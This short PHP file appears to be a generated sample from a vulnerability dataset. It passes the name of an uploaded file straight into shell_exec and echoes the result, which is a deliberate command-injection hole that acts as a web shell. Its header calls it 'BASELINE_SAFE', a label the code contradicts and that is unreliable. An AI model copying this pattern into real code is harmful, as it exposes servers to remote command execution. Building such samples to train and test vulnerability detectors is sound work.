<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=FILE_UPLOAD; CE_MODE=FILES_NAME_ISSET; SKELETON=S2; KEY=cmd; SINK=B3; VAR=v0031 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$f = $_FILES["cmd"] ?? null;
$inp = (is_array($f) && isset($f["name"])) ? (string)$f["name"] : "";
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B3($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
